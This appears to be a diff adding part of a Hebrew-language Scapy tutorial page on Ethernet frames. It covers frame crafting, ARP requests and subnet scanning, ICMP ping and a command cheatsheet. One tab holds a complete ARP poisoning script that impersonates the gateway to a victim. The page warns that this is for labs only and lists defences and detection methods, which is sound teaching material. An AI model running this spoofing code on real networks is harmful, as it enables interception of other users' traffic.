+    <p class="sec-lead">Scapy מאפשרת לבנות כל מסגרת Ethernet ידנית — שדה אחר שדה — ולשלוח אותה לרשת. זהו הכלי המרכזי למחקר רשתות ובדיקות חדירה.</p>
+  </div>
+
+  <!-- CRAFTING TABS -->
+  <div class="tabs-header">
+    <button class="tab-btn active" onclick="switchTab('craft', 'eth-basic')">Ethernet בסיסי</button>
+    <button class="tab-btn" onclick="switchTab('craft', 'arp-craft')">ARP Packet</button>
+    <button class="tab-btn" onclick="switchTab('craft', 'ping')">Ping (ICMP)</button>
+    <button class="tab-btn" onclick="switchTab('craft', 'arp-poison')">ARP Poisoning</button>
+  </div>
+
+  <div id="craft-eth-basic" class="tab-pane active">
+    <div class="two-col" style="gap:24px; align-items:start">
+      <div>
+        <div class="code-wrap">
+          <div class="code-header">
+            <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+            <span class="code-lang">python — מסגרת Ethernet ידנית</span>
+            <button class="copy-btn" onclick="copyCode(this)">העתק</button>
+          </div>
+          <pre><span class="kw">from</span> <span class="op">scapy.all</span> <span class="kw">import</span> <span class="op">*</span>
+
+<span class="cm"># ─── בניית מסגרת Ethernet ─── </span>
+<span class="var">frame</span> <span class="op">=</span> <span class="fn">Ether</span>(
+    dst<span class="op">=</span><span class="mac">"00:11:22:33:44:55"</span>,  <span class="cm"># MAC יעד</span>
+    src<span class="op">=</span><span class="mac">"aa:bb:cc:dd:ee:ff"</span>,  <span class="cm"># MAC מקור</span>
+    type<span class="op">=</span><span class="hx">0x0800</span>               <span class="cm"># EtherType: IPv4</span>
+)
+
+<span class="cm"># ─── הוספת IP + נתונים ───</span>
+<span class="var">pkt</span> <span class="op">=</span> <span class="var">frame</span> <span class="op">/</span> <span class="fn">IP</span>(
+    src<span class="op">=</span><span class="ip">"10.0.0.1"</span>,
+    dst<span class="op">=</span><span class="ip">"10.0.0.2"</span>,
+    ttl<span class="op">=</span><span class="num">64</span>
+) <span class="op">/</span> <span class="fn">Raw</span>(load<span class="op">=</span><span class="str">b"Hello Ethernet!"</span>)
+
+<span class="cm"># ─── הצגה ───</span>
+<span class="var">pkt</span>.show2()  <span class="cm"># show2 = מחושב (לא auto)</span>
+
+<span class="cm"># ─── שליחה בשכבה 2 ───</span>
+<span class="fn">sendp</span>(<span class="var">pkt</span>, iface<span class="op">=</span><span class="str">"eth0"</span>, verbose<span class="op">=</span><span class="kw">False</span>)
+
+<span class="cm"># ─── שליחה מרובה ───</span>
+<span class="fn">sendp</span>(<span class="var">pkt</span>, iface<span class="op">=</span><span class="str">"eth0"</span>,
+      count<span class="op">=</span><span class="num">5</span>, inter<span class="op">=</span><span class="num">0.5</span>)  <span class="cm"># 5 פעמים, מרווח 0.5s</span>
+
+<span class="cm"># ─── שמירה לקובץ ───</span>
+<span class="fn">wrpcap</span>(<span class="str">"my_frame.pcap"</span>, [<span class="var">pkt</span>])</pre>
+        </div>
+      </div>
+      <div>
+        <div class="info-card bc-orange">
+          <div class="ic-title" style="color:var(--orange);">sendp() vs send()</div>
+          <div class="ic-body mt8">
+            <strong>sendp()</strong> — Layer 2: צריך לציין MAC. שולח מסגרת Ethernet ישירות.<br><br>
+            <strong>send()</strong> — Layer 3: עובד עם IP בלבד. ה-OS מוסיף את שכבת Ethernet אוטומטית.<br><br>
+            <strong>srp()</strong> — שלח וקבל תגובה (Layer 2)<br>
+            <strong>sr()</strong> — שלח וקבל תגובה (Layer 3)
+          </div>
+        </div>
+        <div class="code-wrap mt16">
+          <div class="code-header">
+            <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+            <span class="code-lang">// bytes גולמיים</span>
+            <button class="copy-btn" onclick="copyCode(this)">העתק</button>
+          </div>
+          <pre><span class="cm"># גישה ל-bytes הגולמיים</span>
+<span class="var">raw</span> <span class="op">=</span> <span class="fn">bytes</span>(<span class="var">pkt</span>)
+<span class="fn">print</span>(<span class="var">raw</span>.hex())
+<span class="out">0011223344556a…</span>
+<span class="cm">    ^dst MAC^src MAC^</span>
+
+<span class="cm"># קריאה מ-bytes</span>
+<span class="var">recovered</span> <span class="op">=</span> <span class="fn">Ether</span>(<span class="var">raw</span>)
+<span class="var">recovered</span>.show()</pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div id="craft-arp-craft" class="tab-pane">
+    <div class="code-wrap">
+      <div class="code-header">
+        <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        <span class="code-lang">python — בניית ARP Request &amp; Reply</span>
+        <button class="copy-btn" onclick="copyCode(this)">העתק</button>
+      </div>
+      <pre><span class="kw">from</span> <span class="op">scapy.all</span> <span class="kw">import</span> <span class="op">*</span>
+
+<span class="cm"># ─── ARP Request: "מי יש לו 192.168.1.1?" ───</span>
+<span class="var">arp_req</span> <span class="op">=</span> <span class="fn">Ether</span>(
+    dst<span class="op">=</span><span class="mac">"ff:ff:ff:ff:ff:ff"</span>   <span class="cm"># Broadcast!</span>
+) <span class="op">/</span> <span class="fn">ARP</span>(
+    op<span class="op">=</span><span class="num">1</span>,                     <span class="cm"># 1=request, 2=reply</span>
+    hwsrc<span class="op">=</span><span class="mac">"aa:bb:cc:dd:ee:ff"</span>, <span class="cm"># MAC שלנו</span>
+    psrc<span class="op">=</span><span class="ip">"192.168.1.50"</span>,      <span class="cm"># IP שלנו</span>
+    hwdst<span class="op">=</span><span class="mac">"00:00:00:00:00:00"</span>, <span class="cm"># MAC יעד (לא ידוע)</span>
+    pdst<span class="op">=</span><span class="ip">"192.168.1.1"</span>       <span class="cm"># IP שאנחנו שואלים עליו</span>
+)
+
+<span class="cm"># שליחה + קבלת תשובה</span>
+<span class="var">ans</span>, <span class="var">unans</span> <span class="op">=</span> <span class="fn">srp</span>(<span class="var">arp_req</span>, iface<span class="op">=</span><span class="str">"eth0"</span>, timeout<span class="op">=</span><span class="num">2</span>)
+
+<span class="kw">if</span> <span class="var">ans</span>:
+    <span class="fn">print</span>(<span class="str">f"הנתב נמצא: {ans[0][1][ARP].hwsrc}"</span>)
+    <span class="out">הנתב נמצא: 00:11:32:ab:cd:ef</span>
+
+<span class="cm"># ─── ARP Scan — סריקת כל הרשת ───</span>
+<span class="var">scan_pkt</span> <span class="op">=</span> <span class="fn">Ether</span>(dst<span class="op">=</span><span class="mac">"ff:ff:ff:ff:ff:ff"</span>) <span class="op">/</span> \
+           <span class="fn">ARP</span>(pdst<span class="op">=</span><span class="ip">"192.168.1.0/24"</span>)
+
+<span class="var">alive</span>, <span class="var">_</span> <span class="op">=</span> <span class="fn">srp</span>(<span class="var">scan_pkt</span>, iface<span class="op">=</span><span class="str">"eth0"</span>, timeout<span class="op">=</span><span class="num">3</span>)
+
+<span class="fn">print</span>(<span class="str">"\n[+] מחשבים פעילים ברשת:"</span>)
+<span class="kw">for</span> <span class="var">snd</span>, <span class="var">rcv</span> <span class="kw">in</span> <span class="var">alive</span>:
+    <span class="fn">print</span>(<span class="str">f"  IP: {rcv[ARP].psrc:20s}"</span>
+          <span class="str">f"  MAC: {rcv[ARP].hwsrc}"</span>)
+
+<span class="out">[+] מחשבים פעילים ברשת:
+  IP: 192.168.1.1           MAC: 00:11:32:ab:cd:ef
+  IP: 192.168.1.50          MAC: d8:bb:c1:7a:3f:2e
+  IP: 192.168.1.101         MAC: 3c:a9:f4:12:34:56</span></pre>
+    </div>
+  </div>
+
+  <div id="craft-ping" class="tab-pane">
+    <div class="code-wrap">
+      <div class="code-header">
+        <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        <span class="code-lang">python — Ping (ICMP) + Ethernet</span>
+        <button class="copy-btn" onclick="copyCode(this)">העתק</button>
+      </div>
+      <pre><span class="kw">from</span> <span class="op">scapy.all</span> <span class="kw">import</span> <span class="op">*</span>
+
+<span class="cm"># ─── Ping עם שליטה מלאה על Ethernet ───</span>
+<span class="var">ping</span> <span class="op">=</span> <span class="fn">Ether</span>(
+    dst<span class="op">=</span><span class="mac">"00:11:32:ab:cd:ef"</span>,  <span class="cm"># MAC של הנתב</span>
+    src<span class="op">=</span><span class="mac">"d8:bb:c1:7a:3f:2e"</span>   <span class="cm"># MAC שלנו</span>
+) <span class="op">/</span> <span class="fn">IP</span>(
+    src<span class="op">=</span><span class="ip">"192.168.1.50"</span>,
+    dst<span class="op">=</span><span class="ip">"8.8.8.8"</span>,
+    ttl<span class="op">=</span><span class="num">64</span>
+) <span class="op">/</span> <span class="fn">ICMP</span>(type<span class="op">=</span><span class="num">8</span>, code<span class="op">=</span><span class="num">0</span>, id<span class="op">=</span><span class="num">0x1234</span>, seq<span class="op">=</span><span class="num">1</span>) <span class="op">/</span> \
+  <span class="str">b"Hello from Scapy!"</span>
+
+<span class="cm"># שלח וקבל תשובה (Layer 2)</span>
+<span class="var">ans</span>, <span class="var">unans</span> <span class="op">=</span> <span class="fn">srp</span>(<span class="var">ping</span>, iface<span class="op">=</span><span class="str">"eth0"</span>, timeout<span class="op">=</span><span class="num">3</span>)
+
+<span class="kw">for</span> <span class="var">snd</span>, <span class="var">rcv</span> <span class="kw">in</span> <span class="var">ans</span>:
+    <span class="fn">print</span>(<span class="str">f"תגובה מ-{rcv[IP].src}"</span>
+          <span class="str">f" | TTL={rcv[IP].ttl}"</span>
+          <span class="str">f" | MAC={rcv[Ether].src}"</span>)
+    <span class="out">תגובה מ-8.8.8.8 | TTL=118 | MAC=00:11:32:ab:cd:ef</span>
+
+<span class="cm"># ─── הצגת המסגרת שנשלחה ───</span>
+<span class="var">ping</span>.show()
+<span class="out">###[ Ethernet ]###
+  dst       = 00:11:32:ab:cd:ef
+  src       = d8:bb:c1:7a:3f:2e
+  type      = IPv4
+###[ IP ]###
+     src       = 192.168.1.50
+     dst       = 8.8.8.8
+     ttl       = 64
+###[ ICMP ]###
+        type      = echo-request
+        id        = 0x1234
+        seq       = 1
+###[ Raw ]###
+           load      = 'Hello from Scapy!'</span></pre>
+    </div>
+  </div>
+
+  <div id="craft-arp-poison" class="tab-pane">
+    <div class="callout ca-red">
+      <div class="callout-icon">⚠️</div>
+      <div class="callout-body">
+        <strong>אזהרה — לצרכי לימוד בלבד!</strong> ARP Poisoning היא מתקפה בלתי חוקית על רשתות ללא הרשאה.
+        הדוגמה הבאה נועדת <strong>להבין איך ההגנה עובדת</strong> ולזהות את המתקפה. יש להשתמש <strong>רק בסביבת lab מבוקרת</strong>.
+      </div>
+    </div>
+    <div class="code-wrap mt16">
+      <div class="code-header">
+        <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        <span class="code-lang">python — ARP Poisoning (lab only!)</span>
+        <button class="copy-btn" onclick="copyCode(this)">העתק</button>
+      </div>
+      <pre><span class="kw">from</span> <span class="op">scapy.all</span> <span class="kw">import</span> <span class="op">*</span>
+<span class="kw">import</span> <span class="op">time</span>
+
+<span class="cm"># ─── הגדרות ───</span>
+<span class="var">GATEWAY_IP</span>  <span class="op">=</span> <span class="ip">"192.168.1.1"</span>
+<span class="var">VICTIM_IP</span>   <span class="op">=</span> <span class="ip">"192.168.1.100"</span>
+<span class="var">VICTIM_MAC</span>  <span class="op">=</span> <span class="mac">"d8:bb:c1:7a:3f:2e"</span>  <span class="cm"># MAC האמיתי של הקורבן</span>
+<span class="var">GATEWAY_MAC</span> <span class="op">=</span> <span class="mac">"00:11:32:ab:cd:ef"</span>  <span class="cm"># MAC האמיתי של הנתב</span>
+
+<span class="cm"># ─── בניית ARP Reply כוזב ───</span>
+<span class="cm"># אומרים לקורבן: "IP הנתב = MAC שלי"</span>
+<span class="kw">def</span> <span class="fn">poison_victim</span>():
+    <span class="var">pkt</span> <span class="op">=</span> <span class="fn">Ether</span>(dst<span class="op">=</span><span class="var">VICTIM_MAC</span>) <span class="op">/</span> <span class="fn">ARP</span>(
+        op<span class="op">=</span><span class="num">2</span>,               <span class="cm"># 2 = reply (גם ללא בקשה!)</span>
+        hwsrc<span class="op">=</span><span class="fn">get_if_hwaddr</span>(<span class="str">"eth0"</span>),  <span class="cm"># MAC התוקף</span>
+        psrc<span class="op">=</span><span class="var">GATEWAY_IP</span>,   <span class="cm"># מתחזה לנתב!</span>
+        hwdst<span class="op">=</span><span class="var">VICTIM_MAC</span>,
+        pdst<span class="op">=</span><span class="var">VICTIM_IP</span>
+    )
+    <span class="fn">sendp</span>(<span class="var">pkt</span>, iface<span class="op">=</span><span class="str">"eth0"</span>, verbose<span class="op">=</span><span class="kw">False</span>)
+
+<span class="cm"># ─── שחזור הטבלה (Restore) ───</span>
+<span class="kw">def</span> <span class="fn">restore</span>():
+    <span class="cm"># מחזירים את ה-ARP cache לנכון</span>
+    <span class="fn">sendp</span>(<span class="fn">Ether</span>(dst<span class="op">=</span><span class="var">VICTIM_MAC</span>) <span class="op">/</span> <span class="fn">ARP</span>(
+        op<span class="op">=</span><span class="num">2</span>,
+        hwsrc<span class="op">=</span><span class="var">GATEWAY_MAC</span>,  <span class="cm"># ← MAC האמיתי</span>
+        psrc<span class="op">=</span><span class="var">GATEWAY_IP</span>,
+        hwdst<span class="op">=</span><span class="var">VICTIM_MAC</span>,
+        pdst<span class="op">=</span><span class="var">VICTIM_IP</span>
+    ), iface<span class="op">=</span><span class="str">"eth0"</span>, count<span class="op">=</span><span class="num">5</span>, verbose<span class="op">=</span><span class="kw">False</span>)
+
+<span class="cm"># ─── לולאת הרעלה (עצור עם Ctrl+C) ───</span>
+<span class="kw">try</span>:
+    <span class="kw">while</span> <span class="kw">True</span>:
+        <span class="fn">poison_victim</span>()
+        <span class="fn">time</span>.sleep(<span class="num">2</span>)        <span class="cm"># כל 2 שניות</span>
+<span class="kw">except</span> <span class="fn">KeyboardInterrupt</span>:
+    <span class="fn">restore</span>()             <span class="cm"># שחזר לפני יציאה!</span>
+    <span class="fn">print</span>(<span class="str">"[+] ARP table restored"</span>)</pre>
+    </div>
+
+    <div class="cards-grid cg-2 mt16">
+      <div class="info-card bc-green">
+        <div class="ic-icon">🛡️</div>
+        <div class="ic-title" style="color:var(--green);">הגנות מפני ARP Poisoning</div>
+        <div class="ic-body">
+          <strong>Dynamic ARP Inspection (DAI)</strong> — Switches מבוססי Cisco/HP מאמתים ARP replies מול DHCP snooping table.<br><br>
+          <strong>Static ARP entries</strong> — הגדרת ידנית של MAC לנתב: <code>arp -s 192.168.1.1 00:11:32:ab:cd:ef</code><br><br>
+          <strong>VLAN Segmentation</strong> — הפרדת קטעי רשת מפחיתה את שטח ההתקפה.
+        </div>
+      </div>
+      <div class="info-card bc-red">
+        <div class="ic-icon">🔍</div>
+        <div class="ic-title" style="color:var(--red);">זיהוי ARP Poisoning</div>
+        <div class="ic-body">
+          <strong>arp -a</strong> — בדיקה שכתובת MAC של הנתב לא השתנתה.<br><br>
+          <strong>Wireshark filter:</strong> <code>arp.duplicate-address-detected</code><br><br>
+          <strong>XArp / ARP watch</strong> — כלים שמזהירים על שינוי ARP cache.<br><br>
+          <strong>Scapy detection:</strong> ראה דוגמת הקוד בלשונית Sniffing.
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- CHEATSHEET -->
+  <hr class="sec-divider">
+  <div class="reveal">
+    <div class="sec-tag sec-tag-purple" style="margin-bottom:16px;">// Scapy Cheatsheet — Ethernet</div>
+    <div class="code-wrap">
+      <div class="code-header">
+        <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        <span class="code-lang">python — scapy ethernet cheatsheet</span>
+        <button class="copy-btn" onclick="copyCode(this)">העתק</button>
+      </div>
+      <pre><span class="kw">from</span> <span class="op">scapy.all</span> <span class="kw">import</span> <span class="op">*</span>
+
+<span class="cm"># ════════════════════════════════════════════
+#                 BUILDING FRAMES
+# ════════════════════════════════════════════</span>
+<span class="fn">Ether</span>()                        <span class="cm"># מסגרת ברירת מחדל</span>
+<span class="fn">Ether</span>().show()                 <span class="cm"># הצג שדות ברירת מחדל</span>
+<span class="fn">ls</span>(<span class="fn">Ether</span>)                      <span class="cm"># רשימת כל שדות Ether</span>
+
+<span class="cm"># גישה לכתובות</span>
+<span class="var">pkt</span>[<span class="fn">Ether</span>].dst                 <span class="cm"># MAC יעד</span>
+<span class="var">pkt</span>[<span class="fn">Ether</span>].src                 <span class="cm"># MAC מקור</span>
+<span class="var">pkt</span>[<span class="fn">Ether</span>].type                <span class="cm"># EtherType (שלם)</span>
+
+<span class="cm"># כלי עזר ל-MAC</span>
+<span class="fn">get_if_hwaddr</span>(<span class="str">"eth0"</span>)          <span class="cm"># MAC של ממשק</span>
+<span class="fn">getmacbyip</span>(<span class="ip">"192.168.1.1"</span>)     <span class="cm"># MAC לפי IP (ARP)</span>
+
+<span class="cm"># ════════════════════════════════════════════
+#                 SNIFFING
+# ════════════════════════════════════════════</span>
+<span class="fn">sniff</span>(count<span class="op">=</span><span class="num">10</span>)                <span class="cm"># 10 מסגרות</span>
+<span class="fn">sniff</span>(filter<span class="op">=</span><span class="str">"arp"</span>)            <span class="cm"># רק ARP</span>
+<span class="fn">sniff</span>(iface<span class="op">=</span><span class="str">"eth0"</span>)           <span class="cm"># ממשק ספציפי</span>
+<span class="fn">sniff</span>(prn<span class="op">=</span><span class="kw">lambda</span> p: p.summary()) <span class="cm"># callback</span>
+
+<span class="cm"># ════════════════════════════════════════════
+#                 SENDING
+# ════════════════════════════════════════════</span>
+<span class="fn">sendp</span>(<span class="var">pkt</span>)                     <span class="cm"># שלח L2</span>
+<span class="fn">sendp</span>(<span class="var">pkt</span>, iface<span class="op">=</span><span class="str">"eth0"</span>)     <span class="cm"># ממשק ספציפי</span>
+<span class="fn">sendp</span>(<span class="var">pkt</span>, count<span class="op">=</span><span class="num">3</span>, inter<span class="op">=</span><span class="num">1</span>) <span class="cm"># 3 פעמים, כל שניה</span>
+<span class="var">ans</span>,<span class="var">_</span> <span class="op">=</span> <span class="fn">srp</span>(<span class="var">pkt</span>, timeout<span class="op">=</span><span class="num">2</span>)  <span class="cm"># שלח + קבל</span>
+
+<span class="cm"># ════════════════════════════════════════════
+#                 FILES
+# ════════════════════════════════════════════</span>
+<span class="fn">wrpcap</span>(<span class="str">"out.pcap"</span>, <span class="var">pkts</span>)       <span class="cm"># שמור PCAP</span>
+<span class="fn">rdpcap</span>(<span class="str">"cap.pcap"</span>)             <span class="cm"># קרא PCAP</span>
+
+<span class="cm"># ════════════════════════════════════════════
+#                 ANALYSIS
+# ════════════════════════════════════════════</span>
+<span class="var">pkt</span>.haslayer(<span class="fn">ARP</span>)             <span class="cm"># בדיקת שכבה</span>
+<span class="var">pkt</span>.getlayer(<span class="fn">IP</span>)              <span class="cm"># קבלת שכבה</span>
+<span class="fn">hexdump</span>(<span class="var">pkt</span>)                  <span class="cm"># dump בhex</span>
+<span class="fn">bytes</span>(<span class="var">pkt</span>)                     <span class="cm"># bytes גולמיים</span>
+<span class="fn">Ether</span>(<span class="fn">bytes</span>(<span class="var">pkt</span>))             <span class="cm"># Parse bytes</span></pre>
+    </div>
+  </div>
+
+</section>
+
+</main><!-- end main -->
+
+<script>
+// ─── SCROLL PROGRESS + NAV ───
+function onScroll() {
+  const doc = document.documentElement;
+  const pct = (doc.scrollTop / (doc.scrollHeight - doc.clientHeight)) * 100;
+  document.getElementById('prog').style.width = pct + '%';
+
+  // active section
+  const sections = document.querySelectorAll('section[id]');
+  let cur = '';
+  sections.forEach(s => {
+    if (s.getBoundingClientRect().top < 120) cur = s.id;
+  });
+  document.querySelectorAll('[data-sec]').forEach(a => {
+    a.classList.toggle('active', a.dataset.sec === cur);
+  });
+}
+window.addEventListener('scroll', onScroll, { passive: true });
+
+// ─── REVEAL ON SCROLL ───
+const revObserver = new IntersectionObserver((entries) => {
+  entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+}, { threshold: 0.1 });
+document.querySelectorAll('.reveal').forEach(el => revObserver.observe(el));
+
+// ─── FRAME FIELD DETAILS ───
+const FIELD_DATA = {
+  preamble: {
+    name: 'Preamble + SFD',
+    color: '#8090bb',
+    sub: '8 בתים — 7 bytes preamble + 1 byte SFD',
+    col1_title: 'תפקיד',
+    col1: 'ה-Preamble מסנכרן את הצדדים על תחילת מסגרת. רצף <strong>10101010</strong> (0xAA) × 7 מאפשר לנמען לנעול על השידור. ה-SFD (0xAB) מסמן "המסגרת מתחילה עכשיו".',
+    col2_title: 'נקודות חשובות',
+    col2: 'ה-NIC מסיר את ה-Preamble לפני שהנתון מגיע ל-OS. לכן <strong>Wireshark ו-Scapy אינם מציגים אותו</strong>. בניתוח תנועה — לא יהיה גלוי.',
+    ex_label: '// ערכים',
+    ex: 'AA AA AA AA AA AA AA   ← Preamble × 7\nAB                      ← SFD'
+  },
+  dst: {
+    name: 'Destination MAC Address',
+    color: '#ff7b35',
+    sub: '6 בתים — 48 ביט — כתובת המקבל',
+    col1_title: 'כיצד פועל',
+    col1: 'כרטיס הרשת בודק שדה זה לכל מסגרת שמגיעה. אם הכתובת שונה מה-MAC שלו (ואינה Broadcast), ה-NIC <strong>מתעלם מהמסגרת</strong> בחומרה — כך נחסכת עיבוד מיותר ב-CPU.',
+    col2_title: 'כתובות מיוחדות',
+    col2: '<strong>FF:FF:FF:FF:FF:FF</strong> — Broadcast: כולם מקבלים<br><strong>01:xx:xx:xx:xx:xx</strong> — Multicast: קבוצה ספציפית<br><strong>00:00:00:00:00:00</strong> — Null (לא בשימוש רגיל)',
+    ex_label: '// דוגמה',
+    ex: '# Unicast (לנמען אחד)\nFF:FF:FF:FF:FF:FF  ← Broadcast\n# Scapy: Ether(dst="ff:ff:ff:ff:ff:ff")'
+  },
+  src: {
+    name: 'Source MAC Address',
+    color: '#00d4ff',
+    sub: '6 בתים — 48 ביט — כתובת השולח',
+    col1_title: 'מבנה ה-OUI',
+    col1: '<strong>3 בתים ראשונים = OUI</strong> (Organizationally Unique Identifier) — מזהה יצרן, מוקצה ע"י IEEE.<br><br><strong>3 בתים אחרונים = NIC</strong> — מספר ייחודי שנקבע ע"י היצרן לכרטיס הספציפי.',
+    col2_title: 'MAC Spoofing',
+    col2: 'כתובת MAC ניתנת <strong>לשינוי בתוכנה</strong> בכל מערכת הפעלה. לכן MAC אינה מנגנון הזדהות מהימן!<br><br><code>sudo ip link set eth0 address aa:bb:cc:dd:ee:ff</code>',
+    ex_label: '// בדיקת OUI',
+    ex: 'd8:bb:c1 : 7a:3f:2e\n└─ OUI ─┘   └─ NIC ─┘\n# Apple Inc.  # ייחודי'
+  },
+  type: {
+    name: 'EtherType / Length',
+    color: '#ffd600',
+    sub: '2 בתים — מציין פרוטוקול השכבה הבאה',
+    col1_title: 'כיצד פועל',
+    col1: 'אם הערך <strong>≥ 0x0600</strong> — זהו EtherType (פרוטוקול).<br>אם הערך <strong>&lt; 0x0600</strong> — זהו אורך ה-Payload (IEEE 802.3 ישן).<br><br>בפועל, ה-Ethernet המודרני תמיד משתמש ב-EtherType.',
+    col2_title: 'ערכים חשובים',
+    col2: '<strong>0x0800</strong> = IPv4<br><strong>0x0806</strong> = ARP<br><strong>0x86DD</strong> = IPv6<br><strong>0x8100</strong> = 802.1Q VLAN<br><strong>0x88CC</strong> = LLDP',
+    ex_label: '// בScapy',
+    ex: 'Ether(type=0x0800)  ← IPv4\nEther(type=0x0806)  ← ARP\n# Scapy ממלא אוטומטית!'
+  },
+  data: {
+    name: 'Data / Payload',
+    color: '#00ff88',
+    sub: '46–1500 בתים — המידע עצמו',
+    col1_title: 'גבולות גודל',
+    col1: '<strong>מינימום 46 bytes</strong>: כדי לאפשר זיהוי התנגשויות ב-CSMA/CD. אם הנתון קצר יותר — מוסיפים <strong>Padding</strong> (בתים אפס) לפני ה-CRC.<br><br><strong>מקסימום 1500 bytes (MTU)</strong>: חבילות גדולות יותר מפוצלות ב-IP layer.',
+    col2_title: 'תוכן ה-Payload',
+    col2: 'בדרך כלל חבילת <strong>IPv4/IPv6</strong> שבתוכה:<br>TCP Segment / UDP Datagram / ICMP Message<br><br>בחבילת ARP — הנתון הוא ה-ARP message עצמו.',
+    ex_label: '// Jumbo Frames',
+    ex: '# MTU רגיל = 1500 bytes\n# Jumbo Frames = 9000 bytes\n# (נדרש תמיכה בציוד רשת)'
+  },
+  crc: {
+    name: 'CRC32 / FCS',
+    color: '#a855f7',
+    sub: '4 בתים — Frame Check Sequence',
+    col1_title: 'כיצד עובד',
+    col1: 'ה-CRC32 מחושב על <strong>כל שדות המסגרת</strong> (Dst + Src + Type + Data). הנמען מחשב מחדש ומשווה.<br><br>אם שונה — המסגרת <strong>נזרקת בשקט</strong> (לא נשלחת הודעת שגיאה! TCP יטפל בכך).',
+    col2_title: 'גילוי vs תיקון',
+    col2: 'שכבת הקו <strong>רק מגלה</strong> שגיאות (לא מתקנת). תיקון הוא תפקיד TCP בשכבת התעבורה.<br><br><strong>Scapy:</strong> ממלא CRC אוטומטית. אפשר לשנות: <code>pkt[Ether].chksum = 0xDEAD</code>',
+    ex_label: '// חישוב ב-Python',
+    ex: 'import binascii\ncrc = binascii.crc32(frame_bytes)\n# 4 bytes בסוף המסגרת'
+  }
+};
+
+function showField(name) {
+  const data = FIELD_DATA[name];
+  const detail = document.getElementById('field-detail');
+
+  // toggle
+  if (detail.dataset.active === name) {
+    detail.classList.remove('show');
+    detail.dataset.active = '';
+    document.querySelectorAll('.frame-field').forEach(f => f.classList.remove('active'));
+    return;
+  }
+
+  detail.dataset.active = name;
+  document.querySelectorAll('.frame-field').forEach(f => f.classList.remove('active'));
+  event.currentTarget.classList.add('active');
+
+  detail.innerHTML = `
+    <div class="fd-name" style="color:${data.color}">${data.name}</div>
+    <div class="fd-sub">${data.sub}</div>
+    <div class="fd-grid">
+      <div class="fd-block">
+        <div class="fd-block-title">// ${data.col1_title}</div>
+        <div class="fd-block-body">${data.col1}</div>
+      </div>
+      <div class="fd-block">
+        <div class="fd-block-title">// ${data.col2_title}</div>
+        <div class="fd-block-body">${data.col2}</div>
+        <div class="fd-example">
+          <div class="ex-label">${data.ex_label}</div>
+          <pre style="padding:0; margin-top:4px; background:none; font-size: 16px; color:${data.color}">${data.ex}</pre>
+        </div>
+      </div>
+    </div>
+  `;
+  detail.classList.add('show');
+}
+
+// ─── TABS ───
+function switchTab(group, name) {
+  document.querySelectorAll(`[id^="${group}-"]`).forEach(el => el.classList.remove('active'));
+  document.querySelectorAll(`#sec-${group === 'sniff' ? 'sniff' : 'craft'} .tab-btn`).forEach(b => b.classList.remove('active'));
+  document.getElementById(`${group}-${name}`).classList.add('active');
+  event.currentTarget.classList.add('active');
+}
+
+// ─── COPY CODE ───
+function copyCode(btn) {
+  const pre = btn.closest('.code-wrap').querySelector('pre');
+  const text = pre.innerText;
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = '✓ הועתק';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'העתק'; btn.classList.remove('copied'); }, 1800);
+  });
+}
+</script>
+</body>
+</html>
